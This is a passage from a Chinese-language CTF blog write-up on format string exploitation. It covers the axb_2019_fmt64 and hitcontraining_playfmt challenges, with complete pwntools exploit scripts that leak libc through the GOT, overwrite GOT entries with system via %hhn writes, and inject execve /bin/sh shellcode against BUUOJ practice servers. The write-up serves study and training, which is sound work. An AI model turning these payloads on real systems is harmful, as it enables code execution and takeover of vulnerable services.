class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line">sys_addr1 = sys_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (sys_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (sys_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))</span><br><span class="line">sys_addr1_value = sys_addr1-(<span class="number">9</span>+<span class="number">13</span>) <span class="comment"># 前面已经输出了0xa+0x10个字符，要减去</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 假如倒数第二个字节本身比倒数第一个字节小，那倒数第二个字节+0x100，这样才可以写入正确字节</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%8$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931882.png" alt="image-20240130173634524"></p>
+<h2 id="axb-2019-fmt64"><a href="#axb-2019-fmt64" class="headerlink" title="axb_2019_fmt64"></a><code>axb_2019_fmt64</code></h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931312.png" alt="image-20240130200837648"></p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	第一步，计算偏移量为<code>8</code></p>
+<p>​	<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931509.png" alt="image-20240130130959078"></p>
+<p>​	到了与<code>32</code>位程序不一样的地方了，泄漏地址这里如果是按照<code>32</code>的写成<code>payload = p64(puts)+b&#39;%8$saaaa&#39;</code>，然后我们看到发送的数据在<code>puts_got</code>与<code>%8$s</code>之间有很多<code>&#39;00&#39;</code>，字符串中的<code>&#39;00&#39;</code>就代表结束，所以在<code>printf</code>到<code>&#39;00&#39;</code>的时候就以为字符串后面没有内容了，后面的内容也就不会被<code>printf</code>了。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932606.png" alt="屏幕截图 2024-01-30 185641"></p>
+<p>​	因此我们现在要换个写法构造<code>payload</code>，<code>payload = b&#39;%9$saaaa&#39;+p64(puts_got)</code>这样我们可以看到<code>&#39;00&#39;</code>就在后面了，有用的字符串也就不会再被截断了。<code>9</code>是因为现在<code>p64(puts_got)</code>变成了第<code>2</code>个参数了。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932056.png" alt="屏幕截图 2024-01-30 191730"></p>
+<p>​	刚开始我泄漏的是<code>printf</code>函数的<code>got</code>表值，但是不知道为什么一直不成功，后来看别的师傅的<code>wp</code>泄漏的都是<code>puts</code>函数就可以，后来我用<code>read,strlen</code>这些函数都可以。然后我发现<code>puts</code>函数发送的是<code>0x601018</code>（重定位前），接收的是<code>0x7fd7f1458690</code>（重定位后）</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932500.png" alt="屏幕截图 2024-01-30 184334"></p>
+<p>​	而<code>printf</code>函数发送的与接收的一样都是<code>0x601030</code>，也就是说并没有泄漏出<code>printf</code>重定位后的<code>got</code>表值，所以就不能泄漏<code>printf</code>的<code>got</code>表值</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932215.png" alt="屏幕截图 2024-01-30 184858"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">strlen_addr = base_addr+libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strlen_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(strlen_addr))</span><br></pre></td></tr></table></figure>
+
+<p>​	打印出来他们的地址，发现只有后<code>3</code>个字节不一样，我们只需要修改后<code>3</code>个字节即可</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932156.png" alt="image-20240130193456108"></p>
+<p>​	同<code>32</code>位，分别表示出这<code>3</code>个字节</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1 = system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr1)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr2)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr3))  </span><br><span class="line"><span class="comment">#9是输出的“Repeater:”的字符数</span></span><br><span class="line">sys_addr1_value = sys_addr1-<span class="number">9</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br></pre></td></tr></table></figure>
+
+<p>​	构造第二个<code>payload</code>的时候同样不能和<code>32</code>位的题一样了，<code>payload2 = b&#39;%&#39;+bytes(str(sysaddr1_value),encoding=&#39;utf-8&#39;)+b&#39;c&#39;+b&#39;%13$hhn&#39; </code>的意思是将<code>sys_addr1_value</code>的值作为字符写入到第<code>13</code>个参数所指向的内存地址中，<code>%hhn</code>是只修改<code>1</code>个字符的意思。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span> </span><br><span class="line"><span class="comment">#将会使用格式化字符串漏洞将sysaddr1_value的值作为字符写入到第13个参数所指向的内存地址中。</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span> </span><br><span class="line">payload2 = payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#意思是把payload填充到8的整数倍，由于是64位的栈上的地址或者数据都是8个字节的，也就是说8个字节占一个参数位，这里是5倍也就是5个参数，第一个参数的偏移量是8，9，10，11，12</span></span><br><span class="line">payload2 += p64(strlen_got)+p64(strlen_got+<span class="number">1</span>)+p64(strlen_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">#          第13个参数         第14个参数          第15个参数</span></span><br><span class="line"><span class="comment">#综上所述，当对目标地址加一（进行偏移）时，读取到的真实地址就也在变化，这样，我们就可以确定真实地址的每一位所在的位置了</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment">#p = process(&quot;./fmt64&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26762</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">strlen_addr = base_addr+libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strlen_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(strlen_addr))</span><br><span class="line"></span><br><span class="line">sys_addr1 = system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))  </span><br><span class="line">sys_addr1_value = sys_addr1-<span class="number">9</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span> </span><br><span class="line">payload2 = payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(strlen_got)+p64(strlen_got+<span class="number">1</span>)+p64(strlen_got+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932713.png" alt="image-20240130195341584"></p>
+<h2 id="hitcontraining-playfmt（ebp链）"><a href="#hitcontraining-playfmt（ebp链）" class="headerlink" title="hitcontraining_playfmt（ebp链）"></a><code>hitcontraining_playfmt</code>（<code>ebp</code>链）</h2><h3 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h3><p>​	查看保护，<code>32</code>位程序，有<code>RWX</code>段我们第一时间想到用<code>shellcode</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932093.png" alt="image-20240209202319987"></p>
+<p>源码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_fmt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8u</span>);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">&quot;quit&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	分析代码，<code>printf(buf)</code>格式化字符串漏洞，<code>buf</code>在<code>.bss</code>段。大概思路就是利用格式化字符串漏洞修改函数返回地址为<code>buf</code>的起始地址<code>+4</code>（因为执行<code>ret</code>指令就需要跳出循环，就需要<code>buf</code>的前<code>4</code>个字节是<code>quit</code>），最后发送<code>shellcode</code>。</p>
+<p>​	下图中<code>ebp</code>下面的<code>0xffffd07c</code>这个地址中放的是函数返回地址，我们可以把<code>0xffffd098</code>改成<code>0xffffd07c</code>，这样<code>0xffffd088 -&gt; 0xffffd098</code>就变成了<code>0xffffd088 -&gt; 0xffffd07c -&gt; 0x80485ad(play+77)</code>，我们也就可以修改<code>0xffffd07c</code>中的内容即返回地址为<code>shellcode</code>的首地址了。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932681.png" alt="屏幕截图 2024-02-09 202808"></p>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28906</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Server&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;=\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%6$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)-<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%6$hhn&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa064</span>).encode()+<span class="string">b&#x27;c%10$hn&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;quit&#x27;</span>+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932757.png" alt="image-20240209212128942"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"># 格式化字符串漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="prev" title="SROP总结">
+      <i class="fa fa-chevron-left"></i> SROP总结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/%E4%B8%A4%E9%81%93%E6%9C%89%E5%85%B3%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E7%9A%84%E4%BE%8B%E9%A2%98/" rel="next" title="两道有关索引越界的例题">
+      两道有关索引越界的例题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#printf%E4%B8%AD%E7%9A%84%E6%A0%BC%E5%BC%8F%E6%8E%A7%E5%88%B6%E7%AC%A6"><span class="nav-number">1.1.</span> <span class="nav-text">printf中的格式控制符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools%E4%B8%AD%E7%9A%84fmtstr-paylod"><span class="nav-number">1.2.</span> <span class="nav-text">pwntools中的fmtstr_paylod</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.</span> <span class="nav-text">非栈上的格式化字符串漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-fm"><span class="nav-number">2.1.</span> <span class="nav-text">jarvisoj_fm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#axb-2019-fmt32"><span class="nav-number">2.2.</span> <span class="nav-text">axb_2019_fmt32</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%95%E4%B8%80"><span class="nav-number">2.2.1.</span> <span class="nav-text">法一</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-1"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%95%E4%BA%8C"><span class="nav-number">2.2.2.</span> <span class="nav-text">法二</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-2"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#axb-2019-fmt64"><span class="nav-number">2.3.</span> <span class="nav-text">axb_2019_fmt64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">2.3.1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-number">2.3.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcontraining-playfmt%EF%BC%88ebp%E9%93%BE%EF%BC%89"><span class="nav-number">2.4.</span> <span class="nav-text">hitcontraining_playfmt（ebp链）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-%E6%BA%90%E7%A0%81"><span class="nav-number">2.4.1.</span> <span class="nav-text">保护&amp;源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">2.4.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-number">2.4.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:wenw8121@gmail.com" title="E-Mail → mailto:wenw8121@gmail.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">280k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
